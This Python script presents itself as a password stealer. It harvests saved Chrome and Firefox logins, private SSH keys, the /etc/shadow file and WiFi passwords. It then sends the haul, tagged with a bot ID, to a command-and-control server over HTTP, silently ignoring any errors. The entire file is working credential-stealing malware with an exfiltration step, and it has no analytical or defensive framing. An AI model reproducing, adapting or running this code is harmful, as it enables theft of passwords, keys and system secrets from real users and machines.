#!/usr/bin/env python3
# PASSWORD STEALER - Extract passwords from browsers and system
import os
import sys
import json
import base64
import sqlite3
import subprocess
from datetime import datetime

class PasswordStealer:
    def __init__(self, c2_server=None, bot_id=None):
        self.c2_server = c2_server
        self.bot_id = bot_id
        self.passwords = []
        
    def steal_chrome(self):
        """Steal passwords from Chrome/Chromium"""
        try:
            # Find Chrome profile
            chrome_paths = [
                os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
                os.path.expanduser("~/.config/chromium/Default/Login Data"),
                os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
                os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
            ]
            
            for db_path in chrome_paths:
                if os.path.exists(db_path):
                    # Copy database (can't open while Chrome is running)
                    temp_db = "/tmp/chrome_login.db"
                    os.system(f"cp '{db_path}' {temp_db} 2>/dev/null")
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_pass = row
                        if username and encrypted_pass:
                            self.passwords.append({
                                "type": "Chrome",
                                "url": url,
                                "username": username,
                                "password": "[ENCRYPTED]"
                            })
                    conn.close()
                    os.remove(temp_db)
        except:
            pass
    
    def steal_firefox(self):
        """Steal passwords from Firefox"""
        try:
            firefox_paths = [
                os.path.expanduser("~/.mozilla/firefox/*.default/logins.json"),
                os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles/*.default/logins.json")
            ]
            
            import glob
            for pattern in firefox_paths:
                for logins_file in glob.glob(pattern):
                    if os.path.exists(logins_file):
                        with open(logins_file, 'r') as f:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                self.passwords.append({
                                    "type": "Firefox",
                                    "url": login.get('hostname', ''),
                                    "username": login.get('encryptedUsername', ''),
                                    "password": "[ENCRYPTED]"
                                })
        except:
            pass
    
    def steal_ssh_keys(self):
        """Steal SSH keys"""
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            for key in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                key_path = os.path.join(ssh_dir, key)
                if os.path.exists(key_path):
                    with open(key_path, 'r') as f:
                        self.passwords.append({
                            "type": "SSH Key",
                            "url": key_path,
                            "username": key,
                            "password": f.read()[:500]
                        })
    
    def steal_shadow(self):
        """Steal /etc/shadow (requires root)"""
        if os.path.exists("/etc/shadow") and os.geteuid() == 0:
            with open("/etc/shadow", 'r') as f:
                self.passwords.append({
                    "type": "Shadow File",
                    "url": "/etc/shadow",
                    "username": "root",
                    "password": f.read()[:1000]
                })
    
    def steal_wifi(self):
        """Steal WiFi passwords (Linux)"""
        try:
            result = subprocess.run(['sudo', 'cat', '/etc/NetworkManager/system-connections/*'], 
                                   capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'psk=' in line or 'password=' in line:
                    self.passwords.append({
                        "type": "WiFi Password",
                        "url": "WiFi",
                        "username": "network",
                        "password": line.strip()
                    })
        except:
            pass
    
    def steal_all(self):
        """Run all stealers"""
        self.steal_chrome()
        self.steal_firefox()
        self.steal_ssh_keys()
        self.steal_shadow()
        self.steal_wifi()
        return self.passwords
    
    def send_to_c2(self):
        """Send stolen passwords to C2"""
        if not self.c2_server or not self.bot_id:
            return self.passwords
        
        try:
            import requests
            data = {
                "bot_id": self.bot_id,
                "passwords": self.passwords,
                "timestamp": str(datetime.now())
            }
            requests.post(f"{self.c2_server}/api/passwords", json=data, timeout=30)
        except:
            pass
        
        return self.passwords
